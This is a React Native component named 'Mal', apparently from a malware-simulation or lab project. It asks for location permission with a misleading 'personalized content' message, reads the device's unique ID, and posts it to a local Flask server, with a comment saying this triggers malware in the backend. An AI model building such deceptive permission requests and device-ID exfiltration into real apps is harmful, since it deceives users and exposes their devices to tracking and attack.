import React, { useState, useEffect } from 'react';
import { View, Button, Text, Platform, PermissionsAndroid } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { request, PERMISSIONS, RESULTS } from 'react-native-permissions';
import axios from 'axios';
import { useNavigation } from '@react-navigation/native';

const Mal = () => {
  const [deviceId, setDeviceId] = useState('');
  const [status, setStatus] = useState('');
  const [permissionGranted, setPermissionGranted] = useState(false);
  const navigation = useNavigation();

  // Request permissions for location (if needed) or other sensitive data
  useEffect(() => {
    // Automatically request permission after 10 seconds
    const timer = setTimeout(() => {
      requestPermissions();
    }, 10000); // 10 seconds delay

    return () => clearTimeout(timer); // Cleanup the timer when the component unmounts
  }, []);

  const requestPermissions = async () => {
    if (Platform.OS === 'ios') {
      const result = await request(PERMISSIONS.IOS.LOCATION_WHEN_IN_USE);
      if (result === RESULTS.GRANTED) {
        setPermissionGranted(true);
        setStatus('Permission granted');
        navigation.navigate('Home'); // Navigate to HomeScreen after permission
      } else {
        setStatus('Permission denied');
        navigation.navigate('PermissionDeniedScreen'); // Navigate to Permission Denied screen
      }
    } else if (Platform.OS === 'android') {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        {
          title: 'Location Permission',
          message: 'We need access to your location for personalized content',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        }
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        setPermissionGranted(true);
        setStatus('Permission granted');
        navigation.navigate('Home'); // Navigate to HomeScreen after permission
      } else {
        setStatus('Permission denied');
        navigation.navigate('PermissionDeniedScreen'); // Navigate to Permission Denied screen
      }
    }
  };

  // Fetch device info (Device ID, Unique ID)
  const fetchDeviceId = async () => {
    if (permissionGranted) {
      try {
        const id = await DeviceInfo.getUniqueId(); // Fetch unique device ID
        console.log('Device ID:', id);
        setDeviceId(id);
      } catch (error) {
        console.error('Error fetching device ID:', error);
      }
    } else {
      setStatus('Permission not granted.');
    }
  };

  // Register Device with Flask API (Trigger Malware in the backend)
  const registerDevice = async () => {
    if (!deviceId) {
      setStatus('Device ID is missing.');
      return;
    }

    try {
      const response = await axios.post('http://192.168.100.82:5000/register_device', {
        device_id: deviceId,
      });
      console.log('Server Response:', response.data)
      setStatus(response.data.message);
      navigation.navigate('Home')
    } catch (error) {
      console.error('Error registering device:', error.response ? error.response.data : error);
      setStatus('Error registering device.');
    }
  };

  return (
    <View style={{ padding: 20 }}>
      <Text>Device ID: {deviceId}</Text>
      <Button title="Fetch Device ID" onPress={fetchDeviceId} />
      <Text>Status: {status}</Text>
      <Button title="Register Device" onPress={registerDevice} />
    </View>
  );
};

export default Mal;
